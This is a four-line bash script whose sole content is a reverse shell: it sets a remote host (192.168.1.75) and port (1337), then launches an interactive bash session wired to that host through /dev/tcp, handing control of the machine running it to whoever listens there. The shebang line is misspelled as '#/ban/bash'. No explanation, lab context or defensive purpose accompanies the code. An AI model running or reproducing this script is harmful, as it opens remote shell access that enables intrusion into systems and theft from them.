#/ban/bash
export RHOST=192.168.1.75
export RPORT=1337
bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT 0<&1'
